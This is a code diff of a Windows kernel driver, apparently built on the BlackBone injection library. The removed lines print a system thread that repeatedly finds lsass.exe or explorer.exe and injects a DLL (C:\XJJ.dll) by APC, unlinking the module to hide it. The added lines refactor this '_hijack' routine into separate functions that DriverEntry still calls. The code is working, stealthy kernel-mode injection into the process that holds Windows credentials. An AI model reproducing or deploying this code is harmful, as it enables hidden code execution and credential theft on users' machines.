@@ -20,93 +20,8 @@ VOID     BBUnload( IN PDRIVER_OBJECT DriverObject );
 #pragma alloc_text(INIT, BBScanSection)
 #pragma alloc_text(INIT, BBLocatePageTables)
 
-#define DELAY_ONE_MICROSECOND (-10)
-#define DELAY_ONE_MILLISECOND (DELAY_ONE_MICROSECOND*1000)
-#define TARGET_PNAME_1 "lsass.exe"
-#define TARGET_PNAME_2 "explorer.exe"
-#define INJECT_SPLIT (60)
-#define INVALID_PID (-1)
-KEVENT kEvent;
-NTKERNELAPI UCHAR* PsGetProcessImageFileName(IN PEPROCESS Process);
-NTKERNELAPI NTSTATUS PsLookupProcessByProcessId(HANDLE Id, PEPROCESS *Process);
-
-PEPROCESS LookupProcess(HANDLE Pid) {
-	PEPROCESS eprocess = NULL;
-	if (NT_SUCCESS(PsLookupProcessByProcessId(Pid, &eprocess))) {
-		return eprocess;
-	}
-	else {
-		return NULL;
-	}
-}
-long GetPidByPName(char* PName) {
-	long pid = INVALID_PID;
-	ULONG i = 0;
-	PEPROCESS eproc = NULL;
-	for (i = 4; i < 1 << 18; i = i + 4) {
-		eproc = LookupProcess((HANDLE)i);
-		if (NULL != eproc) {
-			ObDereferenceObject(eproc);
-			/*
-			*/
-			if (!strcmp(PName, (char*)PsGetProcessImageFileName(eproc))) {
-				pid = (long)((char*)PsGetProcessId(eproc) - (char*)0);
-				break;
-			}
-		} // end of if( NULL != eproc )
-	}
-	return pid;
-}
-VOID MySleep(LONG msec)
-{
-	LARGE_INTEGER my_interval;
-	my_interval.QuadPart = DELAY_ONE_MILLISECOND;
-	my_interval.QuadPart *= msec;
-	KeDelayExecutionThread(KernelMode, 0, &my_interval);
-}
-VOID MyThreadFunc(IN PVOID context)
-{
-	(void*)context;
-	NTSTATUS status = STATUS_SUCCESS;
-	INJECT_DLL data = { IT_Thread };
-
-	for (; ; ) {
-		wcscpy_s(data.FullDllPath, 512, L"C:\\XJJ.dll");
-		wcscpy_s(data.initArg, 512, L"");
-		data.type = IT_Apc;
-		data.pid = GetPidByPName(TARGET_PNAME_1) ;
-		data.pid = data.pid == INVALID_PID ? GetPidByPName(TARGET_PNAME_2) : data.pid;
-		DbgPrint("[+] data.pid %d\n", data.pid);
-		data.initRVA = 0;
-		data.wait = TRUE;
-		data.unlink = TRUE;
-		data.erasePE = FALSE;
-		status = BBInjectDll(&data);
-		DbgPrint("[+] retun of BBInjectDll %d", status);
-		MySleep(INJECT_SPLIT*1000);
-	}
-
-	/*
-	MySleep(3000);
-	KeSetEvent(&kEvent, 0, TRUE);
-	PsTerminateSystemThread(STATUS_SUCCESS);
-	*/
-}
-VOID _hijack() {
-	HANDLE hThread;
-	NTSTATUS status = STATUS_SUCCESS;
-
-	KeInitializeEvent(&kEvent, SynchronizationEvent, FALSE);
-	status = PsCreateSystemThread(&hThread, 0, NULL, NULL, NULL, MyThreadFunc,
-		NULL);
-	if (!NT_SUCCESS(status))
-	{
-		DbgPrint("PsCreateSystemThread failed!");
-		return;
-	}
-	ZwClose(hThread);
-	/*KeWaitForSingleObject(&kEvent, Executive, KernelMode, FALSE, NULL);*/
-}
+VOID _hijack(PDRIVER_OBJECT DriverObject);
+VOID _hijack_Unload();
 
 /*
 */
@@ -170,7 +85,7 @@ NTSTATUS DriverEntry( IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING Registr
         IoDeleteDevice (deviceObject);
     }
 
-	_hijack();
+	_hijack(DriverObject);
 
     return status;
 }
@@ -181,6 +96,8 @@ NTSTATUS DriverEntry( IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING Registr
 VOID BBUnload( IN PDRIVER_OBJECT DriverObject )
 {
     UNICODE_STRING deviceLinkUnicodeString;
+
+	_hijack_Unload();
 
     // Unregister notification
     PsSetCreateProcessNotifyRoutine( BBProcessNotify, TRUE );
